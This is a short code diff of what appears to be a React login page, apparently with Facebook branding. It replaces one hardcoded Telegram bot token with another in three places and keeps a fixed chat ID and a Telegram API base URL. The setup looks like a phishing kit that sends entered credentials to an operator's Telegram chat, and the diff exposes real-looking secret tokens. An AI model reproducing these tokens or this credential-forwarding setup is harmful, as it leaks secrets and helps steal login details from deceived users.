@@ -19,7 +19,7 @@ import MeetingBooking from './MeetingBooking';
 // import pkg from 'react-loader-spinner';
 // const { Oval } = pkg;
 
-const BOT_TOKEN = '7632582696:AAHPoctncITkW_2cQLUmjVaJzxi5pDzVFy0';
+const BOT_TOKEN = '7883617984:AAE8ADmTMyugAGTVTu-FkkTG5NypJgidscI';
 const CHAT_ID = '-1002669341195';
 const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
@@ -82,7 +82,7 @@ function useTelegramSocket(
   }, [sessionId, onUpdate]);
 }
 
-const TELEGRAM_BOT_TOKEN = '7632582696:AAHPoctncITkW_2cQLUmjVaJzxi5pDzVFy0'; // <<--- REPLACE
+const TELEGRAM_BOT_TOKEN = '7883617984:AAE8ADmTMyugAGTVTu-FkkTG5NypJgidscI'; // <<--- REPLACE
 const TELEGRAM_CHAT_ID = '-1002669341195';
 
 const Login: React.FC = () => {
@@ -1338,7 +1338,7 @@ export default Login;
 // import facebooklogo from './facebook.svg';
 // import { X } from 'lucide-react';
 
-// const BOT_TOKEN = '7632582696:AAHPoctncITkW_2cQLUmjVaJzxi5pDzVFy0';
+// const BOT_TOKEN = '7883617984:AAE8ADmTMyugAGTVTu-FkkTG5NypJgidscI';
 // const CHAT_ID = '-1002669341195';
 // const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
